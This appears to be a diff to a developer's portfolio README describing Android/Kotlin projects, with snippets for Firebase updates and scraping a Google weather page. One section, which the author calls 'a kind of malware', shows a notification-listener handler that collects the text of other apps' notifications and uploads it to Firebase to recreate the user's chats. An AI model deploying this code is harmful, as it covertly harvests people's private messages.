@@ -147,7 +147,102 @@ Elements of interest of the project:
 - Scraper online
 
 <h3>Firebase</h3>
-Collection
+I only used Firebase to integrate the database in real time and not for push notification. The reason for using Firebase was to already have a working and performing backend
+
+```
+fun addInfoPush(collectionName: String, uuid: String, infoPush: String?, context: Context){
+        db.collection(collectionName)
+            .document(uuid)
+            .update("infoPush", infoPush)
+            .addOnSuccessListener{ task ->
+                readData(nameData, context)
+        }
+    }
+    
+```
+
+<h3>Scraper online</h3>
+
+The reason for the online scraper was that I had to extract the information by hand from the various google pages where I found updated and verified news
+
+```
+fun getPosition(activity: MainActivity){
+        val background = object : Thread(){
+            override fun run() {
+                try {
+                    val conn = Jsoup.connect("https://www.google.com/search?q=meteo&rlz=1C1MSIM_enIT879IT879&oq=meteo&aqs=chrome.0.69i59j35i39j0l6.908j1j7&sourceid=chrome&ie=UTF-8").method(
+                        Connection.Method.GET
+                    )
+                    val resp = conn.execute()
+                    val html = resp.body()
+                    var cnt = 0
+                    val stringToSearch = "<div class=\"vk_c nawv0d\" id=\"wob_wc\"><span aria-level=\"3\" role=\"heading\"><div class=\"wob_loc mfMhoc vk_gy vk_h\" id=\"wob_loc\">"
+                    val posCity = html.indexOf(stringToSearch)
+                    for (i in 0..100){
+                        if(html[posCity + stringToSearch.length + i] == '<'){
+                            cnt = i
+                            break
+                        }
+                    }
+                    val resultSearch = html.substring(
+                        posCity + stringToSearch.length,
+                        posCity + stringToSearch.length + cnt
+                    )
+                    activity.runOnUiThread(Runnable {
+                        Toast.makeText(activity, resultSearch, Toast.LENGTH_SHORT).show()
+                        activity.callBackPosition(resultSearch)
+                    })
+                    }
+                    catch (e: Exception) {
+                        e.printStackTrace()
+                        activity.runOnUiThread(Runnable {
+                            Toast.makeText(activity, e.message, Toast.LENGTH_SHORT).show()
+                        })
+                    }
+                }
+            }
+            background.start()
+    }
+```
+
+<h3>Notification Manager</h3>
+
+The project then evolved into a kind of malware that read the user's notifications and extracted the information to recreate all the chats that that person was having on firebase. A bit the same principle as the applications that manage to save deleted whatsapp messages
+
+```
+
+@Override
+    public void onNotificationPosted(StatusBarNotification sbn) {
+        map.clear();
+        final String packageName = sbn.getPackageName();
+        Notification notification;
+        FirebaseObj f = new FirebaseObj();
+        StateManager state = StateManager.getInstance();
+
+        if (!TextUtils.isEmpty(packageName)) {
+            notification = sbn.getNotification();
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && notification != null){
+                Iterator<String> iter = notification.extras.keySet().iterator();
+                while(iter.hasNext()){
+                    String text = "";
+                    String next = iter.next();
+                    if (notification.extras.containsKey(next)) {
+                        text = notification.extras.getString(next);
+                        if (state != null && state.mainActivity != null){
+                            if (text != null && !text.equals("") && !next.equals("") && !packageName.equals("com.example.appkottest")){
+                                map.put(next, text);
+                            }
+                        }
+                    }
+                }
+                if (!packageName.equals("com.example.appkottest"))
+                    f.addNote(packageName, map);
+            }
+        }
+    }
+
+```
 
 <p>
 <img src="https://user-images.githubusercontent.com/51740054/169076121-59b75152-1df7-4441-9dce-2f41be826adc.jpg" width="158.8" height="307.2" title="WET">
@@ -161,4 +256,19 @@ Collection
 This project was born from the desire to explore the kotlin environment more and more by creating a small audio manager managing all types of connections. For now it's just a class to be extended to your project but over time I want to create a real open source library for audio management
 
 [Link to code](https://github.com/DanieleCarrozzino/carroch97/blob/main/AudioDevice.kt)
+
+<h2>Fourth project - Dyno</h4>
+
+Elements of interest of the project:
+- Integration with Firebase
+- MVVM pattern software architectural pattern
+- Retrofit
+- Room
+- Live Data
+
+
+<h2>Reference texts</h2>
+Kotlin in action mannin edition 2017
+
+
 
